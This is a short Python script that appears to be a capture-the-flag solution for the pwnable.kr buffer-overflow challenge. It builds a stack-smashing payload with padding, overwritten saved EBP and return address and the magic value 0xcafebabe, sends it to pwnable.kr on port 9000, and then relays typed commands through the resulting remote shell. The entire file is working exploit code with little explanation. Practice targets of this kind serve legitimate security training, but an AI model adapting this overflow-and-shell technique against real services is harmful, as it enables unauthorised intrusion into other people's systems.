import struct, socket

def main():

	end_string = struct.pack ("<I", 0xcafebabe)
	
	padding = "A" * 44
	return_addr = struct.pack ("<I", 0x43434343) # we control func()'s return address
	saved_ebp = struct.pack ("<I", 0x42424242) # we control the ebp saved value
	payload = padding + saved_ebp + return_addr + end_string
	
	payload += '\n' # the server stops reading only once he gets a '\n' because of the gets()

	client = socket.socket()
	client.connect(('pwnable.kr',9000))
	client.send (payload) # we now have a shell
	
	while True:
		client.send (raw_input('$ ') + '\n')
		print (client.recv (1024))

	return

if __name__ == '__main__':
	main()
